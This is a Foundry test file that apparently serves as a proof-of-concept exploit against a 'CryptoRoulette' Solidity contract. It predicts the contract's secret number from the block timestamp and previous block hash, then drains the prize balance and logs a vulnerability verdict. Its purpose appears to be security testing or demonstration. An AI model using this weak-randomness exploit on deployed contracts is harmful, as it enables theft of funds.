// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/crypto_roulette.sol";

contract CryptoRouletteTest is Test {
    CryptoRoulette roulette;
    uint256 constant BLOCK_NUMBER = 1000;
    uint256 constant BLOCK_TIMESTAMP = 1 days;

    function testPredictableSecretNumber() public {
        // Setup fixed block environment
        vm.roll(BLOCK_NUMBER);
        vm.warp(BLOCK_TIMESTAMP);
        bytes32 prevBlockHash = blockhash(BLOCK_NUMBER - 1);

        // Compute secret number exactly as contract does
        uint256 rawSecret = uint256(
            keccak256(abi.encodePacked(BLOCK_TIMESTAMP, prevBlockHash))
        );
        uint256 computedSecret = uint256(uint8(rawSecret)) % 20 + 1;
        require(
            computedSecret <= 10,
            "Test configuration error: secret number must be <=10"
        );

        roulette = new CryptoRoulette();
        
        // Fund contract with 1 ETH prize
        uint256 prizeAmount = 1 ether;
        deal(address(roulette), prizeAmount);
        
        // Setup player with exactly the bet amount
        uint256 betAmount = roulette.betPrice();
        address player = makeAddr("player");
        deal(player, betAmount);

        // Pre-play balances
        uint256 contractBalanceBefore = address(roulette).balance;
        uint256 playerBalanceBefore = player.balance;

        // Differential Checks: Pre-Trigger State
        console.log("--- BEFORE-Trigger Play ---");
        console.log("Contract ETH balance: ", contractBalanceBefore);
        console.log("Player ETH balance: ", playerBalanceBefore);

        console.log("--- Trigger Play ---");
        vm.prank(player);
        roulette.play{value: betAmount}(uint256(computedSecret));

        // Post-play balances
        uint256 contractBalanceAfter = address(roulette).balance;
        uint256 playerBalanceAfter = player.balance;

        // Differential Checks: Post-Trigger State
        console.log("--- AFTER-Trigger Play ---");
        console.log("Contract ETH balance: ", contractBalanceAfter);
        console.log("Player ETH balance: ", playerBalanceAfter);

        // Vulnerability Verification
        bool contractEmptied = (contractBalanceAfter == 0);
        bool playerBalanceIncreased = (playerBalanceAfter > playerBalanceBefore);
        bool vulnerabilityExists = contractEmptied && playerBalanceIncreased;
        
        console.log("--- Vulnerability Verdict ---");
        console.log("Contract emptied:", contractEmptied ? "YES" : "NO");
        console.log("Player balance increased:", playerBalanceIncreased ? "YES" : "NO");

        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Player successfully drained contract funds by predicting the secret number");
        } else {
            console.log("Vulnerability not Exist: Player failed to drain funds despite predicting secret number");
        }

        // Original assertions remain for test validity
        assertEq(
            contractBalanceAfter,
            0,
            "Contract balance should be 0 after win"
        );
        assertEq(
            playerBalanceAfter,
            playerBalanceBefore + contractBalanceBefore,
            "Player should win contract balance"
        );
    }
}